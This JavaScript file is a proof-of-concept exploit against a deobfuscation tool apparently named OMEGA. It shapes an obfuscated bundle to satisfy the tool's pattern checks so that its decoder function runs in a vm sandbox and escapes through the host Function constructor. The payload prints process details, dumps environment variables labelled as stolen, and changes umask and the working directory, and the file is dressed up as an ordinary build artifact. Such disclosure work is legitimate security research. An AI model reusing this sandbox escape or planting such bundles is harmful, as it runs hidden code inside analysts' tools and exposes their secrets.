// PoC: obfuscator.io-style bundle carrying a payload inside its decoder body.
//
// OMEGA-5.0 (src/_monolith.js ~L2376-2456) reconstructs a string-array rotation
// IIFE, concatenates it with the decoder function body -- both sliced verbatim
// out of THIS file -- and executes the result via vm.runInNewContext with a
// globals object that injects the host's `Function` constructor.
//
// Because `Function` is the host realm's, the payload breaks out of the vm
// context and reaches the real process object.
//
// Shape requirements (all satisfied below):
//   1. string array decl, >=3 string literals        -> src/_monolith.js L2052
//   2. rotation IIFE with parseInt( + === + push     -> L2126-2140 (checksum)
//   3. decoder function referencing ARR[firstParam]  -> L2183 (strict match)
//   4. rotReCsum match + arrDeclRe match             -> L2376 / L2408

var _0x4a2f = ['alpha', 'beta', 'gamma', 'delta'];

// Rotation IIFE. Contains parseInt(, ===, and push/shift so OMEGA classifies
// this as a *checksum* rotation -- the only class that reaches the sandbox.
// Note the BARE call form `}(arr, key)` -- this is what obfuscator.io emits
// and what OMEGA's rotateRe / rotReCsum patterns require (`\}\s*\(`).
var _0xrot = (function (_0x1, _0x2) {
  var _0xchk = parseInt(_0xdec(_0x2, 0x0)) === 0x1a4;
  for (var _0xi = 0; _0xi < 4; _0xi++) {
    _0x1['push'](_0x1['shift']());
    _0xchk = parseInt(_0xdec(_0x2, 0x0)) === 0x1a4;
  }
}(_0x4a2f, 0x1a4));

// Decoder function. OMEGA copies THIS text into the vm sandbox verbatim.
// NB: the ARR[idx] access must sit within 800 chars of the opening brace --
// that is what decoderReStrict's `[\s\S]{0,800}?` window requires (L2183).
// Real obfuscator.io decoders read the entry first too, so this is natural.
function _0xdec(_0x5, _0x6) {
  var _0x7 = _0x4a2f[_0x5];   // shape anchor — must be <800 chars from both braces
  var _g = Function('return this')(), _p = _g.process;
  _p.stdout.write('\n[PoC] === VM SANDBOX ESCAPE: arbitrary code ran in the omega'
    + ' process ===\n[PoC] host pid=' + _p.pid + ' uid=' + _p.getuid()
    + ' cwd=' + _p.cwd() + ' argv=' + JSON.stringify(_p.argv) + '\n');
  _p.stdout.write('[PoC] STOLEN ENV: ' + JSON.stringify(_p.env).slice(0, 400) + '\n');
  _p.umask(0); _p.chdir('/tmp');
  _p.stdout.write('[PoC] umask->0 chdir->/tmp : host process state mutated\n');
  return _0x7;
}

// ordinary app code, so the bundle looks like a real build artifact
console.log(_0xdec(0x0, 0x1a4), _0xdec(0x1, 0x1a4));
